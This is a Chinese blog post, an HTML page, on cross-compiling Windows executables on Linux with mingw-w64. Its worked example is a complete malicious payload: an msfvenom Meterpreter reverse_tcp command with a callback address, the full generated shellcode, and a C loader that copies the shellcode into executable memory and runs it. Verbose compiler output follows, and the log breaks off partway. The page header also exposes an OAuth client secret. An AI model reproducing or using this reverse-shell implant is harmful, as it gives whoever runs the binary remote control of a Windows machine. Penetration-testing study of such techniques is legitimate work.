<!DOCTYPE html>
<html><head>
<title>尝试在 Linux 下编译 exe 可执行文件</title>




<meta charset="utf-8">
<meta name="X-UA-Compatible" content="IE=edge">
<meta name="google-site-verification" content="twaX9bmrayAeCFiSLFsfosnmEjKpOlWNLIYKt5ZIno4">
<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
<meta content="telephone=no" name="format-detection">
<meta name="description" content="试着在 Linux 下将 C 语言代码文件编译成 Windows 可以跑的 exe 文件~">
<meta name="renderer" content="webkit">
<meta name="theme-color" content="#ffffff">



<meta property="og:title" content="尝试在 Linux 下编译 exe 可执行文件" />
<meta property="og:description" content="试着在 Linux 下将 C 语言代码文件编译成 Windows 可以跑的 exe 文件~" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://weepingdogel.github.io/posts/%E5%B0%9D%E8%AF%95%E5%9C%A8linux%E4%B8%8B%E7%BC%96%E8%AF%91exe%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-04-26T14:09:13&#43;08:00" />
<meta property="article:modified_time" content="2021-04-26T14:09:13&#43;08:00" /><meta property="og:site_name" content="WeepingDogel&#39;s Blog" />






<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="尝试在 Linux 下编译 exe 可执行文件"/>
<meta name="twitter:description" content="试着在 Linux 下将 C 语言代码文件编译成 Windows 可以跑的 exe 文件~"/>







<script async src="https://www.googletagmanager.com/gtag/js?id=G-NMWMSQB0MF"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-NMWMSQB0MF', { 'anonymize_ip': false });
}
</script>



<script src="/vendor/js/jquery.min.js" ></script>
<script src="/vendor/js/popper.min.js" ></script>
<script src="/vendor/js/bootstrap.min.js" ></script>
<script src="/vendor/js/smooth-scroll.polyfills.min.js" ></script>
<link type="text/css" rel="stylesheet" href="/vendor/css/bootstrap.min.css">
<script src="/vendor/js/vue.min.js" ></script>




<link rel="icon" href="https://avatars.githubusercontent.com/u/44858874">




<link rel="stylesheet" href="https://weepingdogel.github.io/scss/journal.min.5e8f3f653e9f6ce67bf72ff8ee6fee69decf7b5639a3ae7f8344750ad4e065b1.css" integrity="sha256-Xo8/ZT6fbOZ79y/47m/uad7Pe1Y5o65/g0R1CtTgZbE=" media="screen">



<link rel="stylesheet" href="https://weepingdogel.github.io/scss/dark-mode.min.bdfa63b2e89903517dcbb1032b537d54cff3f425c19d008a78dfe49e6cd07ced.css" integrity="sha256-vfpjsuiZA1F9y7EDK1N9VM/z9CXBnQCKeN/knmzQfO0=" media="screen">


<script src="https://weepingdogel.github.io//js/loadCSS.js"></script>
<script>
  loadCSS("https://fonts.googleapis.com/css?family=Lora|Montserrat|Fira+Mono|Noto+Serif+SC|Material+Icons");
</script>




  
    <script src="https://weepingdogel.github.io//js/toc-collapse.js"></script>
  



<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
<script src="/vendor/js/md5.min.js"></script>
<script>
  var gitalk = new Gitalk({
  clientID: 'a1e928de856334c726b3',
  clientSecret: 'f509df81e9d11e081635dbd9ebba466964694e48',
  repo: 'WeepingDogel.github.io',
  owner: 'weepingdogel',
  admin: ['weepingdogel'],
  id: md5(location.pathname),
  distractionFreeMode: 'false'
  });
  window.onload = function () {
        gitalk.render('gitalk-container')
  }
</script>








</head>
<body>
    	<div id="app"><div ref="sideContainer" class="side-container">
    
    <a class="a-block nav-head false" href="https://weepingdogel.github.io/">
    
        <div class="nav-title">
            WeepingDogel&#39;s Blog
        </div>
        
        <div class="nav-subtitle">
            Write to share.
        </div>
        
    </a>

    <div class="nav-link-list">
        
        
            
            
            
                
            
            
            
            <a class="a-block nav-link-item active" href="/posts">
                Posts
            </a>
            
        
            
            
            
            
            
            <a class="a-block nav-link-item false" href="/categories">
                分类
            </a>
            
        
            
            
            
            
            
            <a class="a-block nav-link-item false" href="/tags">
                标签
            </a>
            
        
            
            
            
            
            
            <a class="a-block nav-link-item false" href="/index.xml">
                RSS订阅
            </a>
            
        
            
            
            
            
            
            <a class="a-block nav-link-item false" href="/friends">
                Friends
            </a>
            
        
            
            
            
            
            
            <a class="a-block nav-link-item false" href="/about">
                关于(About)
            </a>
            
        
    </div>

    

    <div class="nav-footer">
        
Hugo Theme <a href="https://github.com/amazingrise/hugo-theme-diary">Diary</a> by <a href="https://amazingrise.net">Rise</a>
<br>
移植自 <a href="https://mak1t0.cc/" target="_blank" rel="noreferrer noopener">Makito</a>'s <a href="https://github.com/SumiMakito/hexo-theme-journal/" target="_blank" rel="noreferrer noopener">Journal.</a> <br>
<br>

&copy;
	
	2019-2021 | WeepingDogel via CC-BY-NC 4.0
	

    </div>
    
</div><div ref="extraContainer" class="extra-container">
    
    
    <div class="toc animated-visibility" :class="{ invisible: scrollY <= 140 }">


	<div class="toc-content">
	
		
		
		
		<center>- 目录 -</center>
		
		
		<ul>
			
				
				
					
						
						
						
						
							
								<ul class="collapse" data-toggle="collapse">
							
						
						
							<li>
								<a href="#%e5%ba%8f" onclick="onNavClick(`#序-nav`)" id="序-nav">
									序
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#mingw-w64" onclick="onNavClick(`#mingw-w64-nav`)" id="mingw-w64-nav">
									mingw-w64
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e5%bc%80%e5%a7%8b%e7%bc%96%e8%af%91" onclick="onNavClick(`#开始编译-nav`)" id="开始编译-nav">
									开始编译
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e6%a3%80%e9%aa%8c" onclick="onNavClick(`#检验-nav`)" id="检验-nav">
									检验
								</a>
							</li>
						
						
					
				
			
		</ul>
	</div>

</div>
    
    <div class="pagination">
        <a id="globalBackToTop" class="pagination-action animated-visibility" href="#top" :class="{ invisible: scrollY == 0 }">
            <i class="material-icons pagination-action-icon">
                keyboard_arrow_up
            </i>
        </a>
        
        <a class="pagination-action" v-on:click="toggleDarkMode">
            <i class="material-icons pagination-action-icon" v-if="isDarkMode">
                brightness_4
            </i>
            <i class="material-icons pagination-action-icon" v-else="isDarkMode">
                brightness_7
            </i>
        </a>
        
        
    </div>
</div>
<div class="single-column-drawer-container" ref="drawer"
     v-bind:class="{ 'single-column-drawer-container-active': isDrawerOpen }">
    <div class="drawer-content">
        <div class="drawer-menu">
            
            
            
                
                
                
                    
                
                
                
                <a class="a-block drawer-menu-item active" href="/posts">
                    Posts
                </a>
                
            
                
                
                
                
                
                <a class="a-block drawer-menu-item false" href="/categories">
                    分类
                </a>
                
            
                
                
                
                
                
                <a class="a-block drawer-menu-item false" href="/tags">
                    标签
                </a>
                
            
                
                
                
                
                
                <a class="a-block drawer-menu-item false" href="/index.xml">
                    RSS订阅
                </a>
                
            
                
                
                
                
                
                <a class="a-block drawer-menu-item false" href="/friends">
                    Friends
                </a>
                
            
                
                
                
                
                
                <a class="a-block drawer-menu-item false" href="/about">
                    关于(About)
                </a>
                
            
            
            <div class="toc">


	<div class="toc-content">
	
		
		
		
		<center>- 目录 -</center>
		
		
		<ul>
			
				
				
					
						
						
						
						
							
								<ul class="collapse" data-toggle="collapse">
							
						
						
							<li>
								<a href="#%e5%ba%8f" onclick="onNavClick(`#序-nav`)" id="序-nav">
									序
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#mingw-w64" onclick="onNavClick(`#mingw-w64-nav`)" id="mingw-w64-nav">
									mingw-w64
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e5%bc%80%e5%a7%8b%e7%bc%96%e8%af%91" onclick="onNavClick(`#开始编译-nav`)" id="开始编译-nav">
									开始编译
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e6%a3%80%e9%aa%8c" onclick="onNavClick(`#检验-nav`)" id="检验-nav">
									检验
								</a>
							</li>
						
						
					
				
			
		</ul>
	</div>

</div>
            
        </div>
    </div>
</div>
<transition name="fade">
    <div v-bind:class="{ 'single-column-drawer-mask': mounted }" v-if="isDrawerOpen" v-on:click="toggleDrawer"></div>
</transition>
<nav ref="navBar" class="navbar sticky-top navbar-light single-column-nav-container">
    <div ref="navBackground" class="nav-background"></div>
    <div class="container container-narrow nav-content">
        <button id="nav_dropdown_btn" class="nav-dropdown-toggle" type="button" v-on:click="toggleDrawer">
            <i class="material-icons">
                menu
            </i>
        </button>
        <a ref="navTitle" class="navbar-brand" href="https://weepingdogel.github.io/">
            WeepingDogel&#39;s Blog
        </a>
        
        <button type="button" class="nav-darkmode-toggle" v-on:click="toggleDarkMode">
            <i class="material-icons" v-if="isDarkMode">
                brightness_4
            </i>
            <i class="material-icons" v-else="isDarkMode">
                brightness_7
            </i>
        </button>
        
    </div>
</nav>
<div class="single-column-header-container" ref="pageHead"
     v-bind:style="{ transform: 'translateZ(0px) translateY('+.3*scrollY+'px)', opacity: 1-navOpacity }">
    <a href="https://weepingdogel.github.io/">
        <div class="single-column-header-title">WeepingDogel&#39;s Blog</div>
        
        <div class="single-column-header-subtitle">Write to share.</div>
        

    </a>
</div>

            <div id="content">
<div ref="streamContainer" class="stream-container">
    <div class="post-list-container post-list-container-shadow">
        <div class="post">
            
            
            
                
            

            <div class="post-head-wrapper"
                
                    
                    
                    style="background-image: url('https://weepingdogel.github.io/img/2021-05-07-18-18-28%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png')"
                    
                
            >
                <div class="post-title">
                    尝试在 Linux 下编译 exe 可执行文件
                    
                    <div class="post-subtitle">
                        试着在 Linux 下将 C 语言代码文件编译成 Windows 可以跑的 exe 文件~
                    </div>
                    
                    <div class="post-meta">
                        
                        <time itemprop="datePublished">
                            2021-04-26 14:09
                        </time>
                        

                        
                            <i class="material-icons" style="">folder</i>
                                <a href="/categories/%E7%BC%96%E7%A8%8B">编程</a>
                                &nbsp;
                        

                        
                            <i class="material-icons" style="">label</i>
                            
                                <a href="/tags/c-%E8%AF%AD%E8%A8%80">C 语言</a>
                                &nbsp;
                            
                                <a href="/tags/%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91">交叉编译</a>
                                &nbsp;
                            
                                <a href="/tags/%E7%BC%96%E7%A8%8B">编程</a>
                                &nbsp;
                            
                                <a href="/tags/gcc">gcc</a>
                                &nbsp;
                            
                                <a href="/tags/windows">Windows</a>
                                &nbsp;
                            
                                <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95">渗透测试</a>
                                &nbsp;
                            
                        
                        
                    </div>
                </div>
            </div>
            
            <div class="post-body-wrapper">
                
                <div class="post-body" v-pre>
                
                    <h2 id="序">序</h2>
<p>最近一直在想有没有什么办法可以在 Linux 环境下编译 Windows 中可以运行的 exe 文件，由于自己没有 Windows 环境， 就算开虚拟机也多多少少有些不方便..</p>
<p>于是就去谷歌了一下.. 发现办法是有的.</p>
<p>这种办法叫做交叉编译, 要用到交叉编译器</p>
<p>我们看看维基百科上怎么说</p>
<blockquote>
<p>交叉编译器（英语：Cross compiler）是指一个在某个系统平台下可以产生另一个系统平台的可执行文件的编译器。交叉编译器在目标系统平台（开发出来的应用程序序所运行的平台）难以或不容易编译时非常有用。</p>
<p>交叉编译器的存在对于从一个开发主机为多个平台编译代码是非常有必要的。直接在平台上编译有时行不通，例如在一个嵌入式系统的单片机 ，因为它们没有操作系统，所以直接编译行不通。</p>
<p>交叉编译器和源代码至源代码编译器不同，交叉编译器用于二进制代码的跨平台软件开发，而源到源编译器是将某种编程语言的程序源代码作为输入，生成以另一种编程语言构成的等效源代码的编译器，但两者都是编程工具。</p>
<p>rel: <a href="https://zh.wikipedia.org/zh-hans/%E4%BA%A4%E5%8F%89%E7%B7%A8%E8%AD%AF%E5%99%A8">https://zh.wikipedia.org/zh-hans/%E4%BA%A4%E5%8F%89%E7%B7%A8%E8%AD%AF%E5%99%A8</a></p>
</blockquote>
<p>概念就是这样..</p>
<h2 id="mingw-w64">mingw-w64</h2>
<p>这大概是个交叉编译器了</p>
<p>看看官网怎么说</p>
<blockquote>
<p>Mingw-w64 is an advancement of the original mingw.org project, created to support the GCC compiler on Windows systems. It has forked it in 2007 in order to provide support for 64 bits and new APIs. It has since then gained widespread use and distribution.</p>
<p>rel: <a href="https://mingw-w64.org/doku.php">https://mingw-w64.org/doku.php</a></p>
</blockquote>
<p>好的接下来我们就安装它， 这里 Arch 就直接从 pacman 装上了</p>
<div class="highlight"><pre style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">$ sudo pacman -S mingw-w64
</code></pre></div><p><img src="/img/2021-04-26-14-32-57%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="">
<img src="/img/2021-04-26-14-33-58%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""></p>
<h2 id="开始编译">开始编译</h2>
<p>那么， 装完之后就可以开始编译了</p>
<p>我打算编译一个 payload 试试看，嘿嘿</p>
<p>首先我们先用 <code>msfvenom</code> 生成一段 <code>shellcode</code></p>
<div class="highlight"><pre style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">$ msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.0.112 LPORT=3333 -f c &gt;&gt; shellcode.c
</code></pre></div><div class="highlight"><pre style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#cdcaa9;font-weight:bold">unsigned</span> <span style="color:#cdcaa9;font-weight:bold">char</span> buf[] = 
<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x89\xe5\x64\x8b\x52\x30</span><span style="color:#0086d2">&#34;</span>
<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x8b\x52\x0c\x8b\x52\x14\x0f\xb7\x4a\x26\x31\xff\x8b\x72\x28</span><span style="color:#0086d2">&#34;</span>
<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49</span><span style="color:#0086d2">&#34;</span>
<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78</span><span style="color:#0086d2">&#34;</span>
<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x85\xc0\x74\x4c\x01\xd0\x8b\x48\x18\x8b\x58\x20\x50\x01\xd3</span><span style="color:#0086d2">&#34;</span>
<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x85\xc9\x74\x3c\x31\xff\x49\x8b\x34\x8b\x01\xd6\x31\xc0\xac</span><span style="color:#0086d2">&#34;</span>
<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24</span><span style="color:#0086d2">&#34;</span>
<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c</span><span style="color:#0086d2">&#34;</span>
<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59</span><span style="color:#0086d2">&#34;</span>
<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d</span><span style="color:#0086d2">&#34;</span>
<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26</span><span style="color:#0086d2">&#34;</span>
<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68</span><span style="color:#0086d2">&#34;</span>
<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\x6d\xa6\x24\x38\x68\x02</span><span style="color:#0086d2">&#34;</span>
<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x00\x35\x16\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea</span><span style="color:#0086d2">&#34;</span>
<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61</span><span style="color:#0086d2">&#34;</span>
<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00</span><span style="color:#0086d2">&#34;</span>
<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83</span><span style="color:#0086d2">&#34;</span>
<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a</span><span style="color:#0086d2">&#34;</span>
<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57</span><span style="color:#0086d2">&#34;</span>
<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00</span><span style="color:#0086d2">&#34;</span>
<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68</span><span style="color:#0086d2">&#34;</span>
<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff</span><span style="color:#0086d2">&#34;</span>
<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb</span><span style="color:#0086d2">&#34;</span>
<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5</span><span style="color:#0086d2">&#34;</span>;
</code></pre></div><p>然后编写我们的代码</p>
<div class="highlight"><pre style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#ff0007;background-color:#0f140f;font-weight:bold;font-style:italic">#include</span><span style="color:#ff0007;background-color:#0f140f;font-weight:bold;font-style:italic">&lt;windows.h&gt;</span><span style="color:#ff0007;background-color:#0f140f;font-weight:bold;font-style:italic">
</span><span style="color:#ff0007;background-color:#0f140f;font-weight:bold;font-style:italic">#include</span><span style="color:#ff0007;background-color:#0f140f;font-weight:bold;font-style:italic">&lt;stdio.h&gt;</span><span style="color:#ff0007;background-color:#0f140f;font-weight:bold;font-style:italic">
</span><span style="color:#ff0007;background-color:#0f140f;font-weight:bold;font-style:italic"></span>
<span style="color:#cdcaa9;font-weight:bold">unsigned</span> <span style="color:#cdcaa9;font-weight:bold">char</span> shellcode[] =
<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30</span><span style="color:#0086d2">&#34;</span>
<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x8b\x52\x0c\x8b\x52\x14\x0f\xb7\x4a\x26\x8b\x72\x28\x31\xff</span><span style="color:#0086d2">&#34;</span>
<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49</span><span style="color:#0086d2">&#34;</span>
<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x75\xef\x52\x8b\x52\x10\x8b\x42\x3c\x57\x01\xd0\x8b\x40\x78</span><span style="color:#0086d2">&#34;</span>
<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x85\xc0\x74\x4c\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3</span><span style="color:#0086d2">&#34;</span>
<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x85\xc9\x74\x3c\x31\xff\x49\x8b\x34\x8b\x01\xd6\x31\xc0\xc1</span><span style="color:#0086d2">&#34;</span>
<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\xcf\x0d\xac\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24</span><span style="color:#0086d2">&#34;</span>
<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c</span><span style="color:#0086d2">&#34;</span>
<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59</span><span style="color:#0086d2">&#34;</span>
<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d</span><span style="color:#0086d2">&#34;</span>
<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26</span><span style="color:#0086d2">&#34;</span>
<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68</span><span style="color:#0086d2">&#34;</span>
<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x00\x70\x68\x02</span><span style="color:#0086d2">&#34;</span>
<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x00\x0d\x05\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea</span><span style="color:#0086d2">&#34;</span>
<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61</span><span style="color:#0086d2">&#34;</span>
<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00</span><span style="color:#0086d2">&#34;</span>
<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83</span><span style="color:#0086d2">&#34;</span>
<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a</span><span style="color:#0086d2">&#34;</span>
<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57</span><span style="color:#0086d2">&#34;</span>
<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00</span><span style="color:#0086d2">&#34;</span>
<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68</span><span style="color:#0086d2">&#34;</span>
<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff</span><span style="color:#0086d2">&#34;</span>
<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb</span><span style="color:#0086d2">&#34;</span>
<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5</span><span style="color:#0086d2">&#34;</span>;

<span style="color:#cdcaa9;font-weight:bold">void</span> <span style="color:#ff0086;font-weight:bold">main</span>(){
    printf(<span style="color:#0086d2">&#34;啊哈！你中毒啦！&#34;</span>);
    <span style="color:#080;background-color:#0f140f;font-style:italic">//ShellExecute(NULL, _T(&#34;open&#34;), _T(&#34;explorer.exe&#34;), _T(&#34;https://www.baiud.com&#34;), NULL, SW_SHOW);
</span><span style="color:#080;background-color:#0f140f;font-style:italic"></span>    LPVOID Memory = VirtualAlloc(NULL, <span style="color:#fb660a;font-weight:bold">sizeof</span>(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(Memory, shellcode, <span style="color:#fb660a;font-weight:bold">sizeof</span>(shellcode));
    ((<span style="color:#cdcaa9;font-weight:bold">void</span>(*)())Memory)();
}
</code></pre></div><blockquote>
<p>PS: 这是抄的(bushi)</p>
</blockquote>
<p>接下来进行编译</p>
<div class="highlight"><pre style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">$ i686-w64-mingw32-gcc-10.2.0 payload.c -o payload.exe -v
</code></pre></div><div class="highlight"><pre style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">使用内建 specs。
COLLECT_GCC=i686-w64-mingw32-gcc-10.2.0
COLLECT_LTO_WRAPPER=/usr/lib/gcc/i686-w64-mingw32/10.2.0/lto-wrapper
目标：i686-w64-mingw32
配置为：/build/mingw-w64-gcc/src/gcc/configure --prefix=/usr --libexecdir=/usr/lib --target=i686-w64-mingw32 --with-bugurl=https://bugs.archlinux.org/ --enable-languages=c,lto,c++,ada,objc,obj-c++,fortran --enable-shared --enable-static --enable-threads=posix --enable-fully-dynamic-string --enable-libstdcxx-time=yes --enable-libstdcxx-filesystem-ts=yes --with-system-zlib --enable-cloog-backend=isl --enable-lto --enable-libgomp --disable-multilib --enable-checking=release --disable-sjlj-exceptions --with-dwarf2
线程模型：posix
Supported LTO compression algorithms: zlib zstd
gcc 版本 10.2.0 (GCC) 
COLLECT_GCC_OPTIONS=&#39;-o&#39; &#39;payload.exe&#39; &#39;-v&#39; &#39;-mtune=generic&#39; &#39;-march=pentiumpro&#39;
 /usr/lib/gcc/i686-w64-mingw32/10.2.0/cc1 -quiet -v -D_REENTRANT payload.c -quiet -dumpbase payload.c -mtune=generic -march=pentiumpro -auxbase payload -version -o /tmp/ccMByM5H.s
GNU C17 (GCC) 版本 10.2.0 (i686-w64-mingw32)
	由 GNU C 版本 10.2.0 编译，GMP 版本 6.2.0，MPFR 版本 4.1.0，MPC 版本 1.1.0，isl 版本 isl-0.21-GMP

警告：GMP 头文件版本 6.2.0 与库版本 6.2.1 不同。
警告：MPC 头文件版本 1.1.0 与库版本 1.2.1 不同。
GGC 准则：--param ggc-min-expand=100 --param ggc-min-heapsize=131072
忽略不存在的目录“/usr/lib/gcc/i686-w64-mingw32/10.2.0/../../../../i686-w64-mingw32/sys-include”
#include &#34;...&#34; 搜索从这里开始：
#include &lt;...&gt; 搜索从这里开始：
 /usr/lib/gcc/i686-w64-mingw32/10.2.0/include
 /usr/lib/gcc/i686-w64-mingw32/10.2.0/include-fixed
 /usr/lib/gcc/i686-w64-mingw32/10.2.0/../../../../i686-w64-mingw32/include
搜索列表结束。
GNU C17 (GCC) 版本 10.2.0 (i686-w64-mingw32)
	由 GNU C 版本 10.2.0 编译，GMP 版本 6.2.0，MPFR 版本 4.1.0，MPC 版本 1.1.0，isl 版本 isl-0.21-GMP

警告：GMP 头文件版本 6.2.0 与库版本 6.2.1 不同。
警告：MPC 头文件版本 1.1.0 与库版本 1.2.1 不同。
GGC 准则：--param ggc-min-expand=100 --param ggc-min-heapsize=131072
Compiler executable checksum: ded9fca0c6f5f53dad787dacd8ef9b9f
COLLECT_GCC_OPTIONS=&#39;-o&#39; &#39;payload.exe&#39; &#39;-v&#39; &#39;-mtune=generic&#39; &#39;-march=pentiumpro&#39;
 /usr/lib/gcc/i686-w64-mingw32/10.2.0/../../../../i686-w64-mingw32/bin/as -v -o /tmp/ccvhBE4k.o /tmp/ccMByM5H.s
GNU assembler version 2.35.1 (i686-w64-mingw32) using BFD version (GNU Binutils) 2.35.1
COMPILER_PATH=/usr/lib/gcc/i686-w64-mingw32/10.2.0/:/usr/lib/gcc/i686-w64-mingw32/10.2.0/:/usr/lib/gcc/i686-w64-mingw32/:/usr/lib/gcc/i686-w64-mingw32/10.2.0/:/usr/lib/gcc/i686-w64-mingw32/:/usr/lib/gcc/i686-w64-mingw32/10.2.0/../../../../i686-w64-mingw32/bin/
LIBRARY_PATH=/usr/lib/gcc/i686-w64-mingw32/10.2.0/:/usr/lib/gcc/i686-w64-mingw32/10.2.0/../../../../i686-w64-mingw32/lib/../lib/:/usr/lib/gcc/i686-w64-mingw32/10.2.0/../../../../i686-w64-mingw32/lib/
